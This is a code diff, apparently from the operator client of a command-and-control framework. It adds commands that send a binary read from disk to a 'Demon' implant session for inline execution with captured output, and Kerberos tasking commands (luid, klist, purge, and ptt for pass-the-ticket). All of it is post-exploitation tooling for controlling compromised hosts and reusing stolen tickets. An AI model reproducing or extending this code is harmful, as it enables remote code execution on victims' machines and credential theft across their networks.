@@ -102,6 +102,31 @@ auto CommandExecute::InlineExecute( QString TaskID, QString FunctionName, QStrin
             { "CommandLine",    DemonCommandInstance->CommandInputList[TaskID].toStdString() },
             { "DemonID",        this->DemonCommandInstance->DemonConsole->SessionInfo.Name.toStdString() },
             { "CommandID",      to_string( static_cast<int>( Commands::INLINE_EXECUTE ) ).c_str() },
+            { "HasCallback",    "false"},
+
+            { "FunctionName",   FunctionName.toStdString() },
+            { "Binary",         Content.toBase64().toStdString() },
+            { "Arguments",      Util::base64_encode( Args.toStdString().c_str(), Args.length() ) },
+            { "Flags",          Flags.toStdString() },
+         },
+    };
+
+    NewPackageCommand( this->DemonCommandInstance->Teamserver, Body );
+}
+
+auto CommandExecute::InlineExecuteGetOutput( QString TaskID, QString FunctionName, QString Path, QByteArray Args, QString Flags ) -> void
+{
+    auto Content = FileRead( Path );
+    if ( Content.isEmpty() ) return;
+
+    auto Body    = Util::Packager::Body_t {
+        .SubEvent = Util::Packager::Session::SendCommand,
+        .Info = {
+            { "TaskID",         TaskID.toStdString() },
+            { "CommandLine",    DemonCommandInstance->CommandInputList[TaskID].toStdString() },
+            { "DemonID",        this->DemonCommandInstance->DemonConsole->SessionInfo.Name.toStdString() },
+            { "CommandID",      to_string( static_cast<int>( Commands::INLINE_EXECUTE ) ).c_str() },
+            { "HasCallback",    "true"},
 
             { "FunctionName",   FunctionName.toStdString() },
             { "Binary",         Content.toBase64().toStdString() },
@@ -468,6 +493,86 @@ auto CommandExecute::Socket( const QString &TaskID, QString SubCommand, QString 
 
                     { "Command",     SubCommand.toStdString() },
                     { "Params",      Arguments.toStdString() },
+            },
+    };
+
+    NewPackageCommand( DemonCommandInstance->Teamserver, Body );
+}
+
+auto CommandExecute::Luid( const QString& TaskID ) -> void
+{
+    auto Body = Util::Packager::Body_t {
+            .SubEvent = Util::Packager::Session::SendCommand,
+            .Info = {
+                    { "TaskID",      TaskID.toStdString() },
+                    { "DemonID",     this->DemonCommandInstance->DemonConsole->SessionInfo.Name.toStdString() },
+
+                    { "CommandID",   to_string( ( int ) Commands::KERBEROS ).c_str() },
+                    { "CommandLine", DemonCommandInstance->CommandInputList[ TaskID ].toStdString() },
+
+                    { "Command",     "luid" },
+            },
+    };
+
+    NewPackageCommand( DemonCommandInstance->Teamserver, Body );
+}
+
+auto CommandExecute::Klist( const QString &TaskID, QString Argument1, QString Argument2 ) -> void
+{
+    auto Body = Util::Packager::Body_t {
+            .SubEvent = Util::Packager::Session::SendCommand,
+            .Info = {
+                    { "TaskID",      TaskID.toStdString() },
+                    { "DemonID",     this->DemonCommandInstance->DemonConsole->SessionInfo.Name.toStdString() },
+
+                    { "CommandID",   to_string( ( int ) Commands::KERBEROS ).c_str() },
+                    { "CommandLine", DemonCommandInstance->CommandInputList[ TaskID ].toStdString() },
+
+                    { "Command",     "klist" },
+
+                    { "Argument1",   Argument1.toStdString() },
+                    { "Argument2",   Argument2.toStdString() },
+            },
+    };
+
+    NewPackageCommand( DemonCommandInstance->Teamserver, Body );
+}
+
+auto CommandExecute::Purge( const QString &TaskID, QString Argument ) -> void
+{
+    auto Body = Util::Packager::Body_t {
+            .SubEvent = Util::Packager::Session::SendCommand,
+            .Info = {
+                    { "TaskID",      TaskID.toStdString() },
+                    { "DemonID",     this->DemonCommandInstance->DemonConsole->SessionInfo.Name.toStdString() },
+
+                    { "CommandID",   to_string( ( int ) Commands::KERBEROS ).c_str() },
+                    { "CommandLine", DemonCommandInstance->CommandInputList[ TaskID ].toStdString() },
+
+                    { "Command",     "purge" },
+
+                    { "Argument",    Argument.toStdString() },
+            },
+    };
+
+    NewPackageCommand( DemonCommandInstance->Teamserver, Body );
+}
+
+auto CommandExecute::Ptt( const QString &TaskID, QString Ticket, QString Luid ) -> void
+{
+    auto Body = Util::Packager::Body_t {
+            .SubEvent = Util::Packager::Session::SendCommand,
+            .Info = {
+                    { "TaskID",      TaskID.toStdString() },
+                    { "DemonID",     this->DemonCommandInstance->DemonConsole->SessionInfo.Name.toStdString() },
+
+                    { "CommandID",   to_string( ( int ) Commands::KERBEROS ).c_str() },
+                    { "CommandLine", DemonCommandInstance->CommandInputList[ TaskID ].toStdString() },
+
+                    { "Command",     "ptt" },
+
+                    { "Ticket",    Ticket.toStdString() },
+                    { "Luid",      Luid.toStdString() },
             },
     };
 
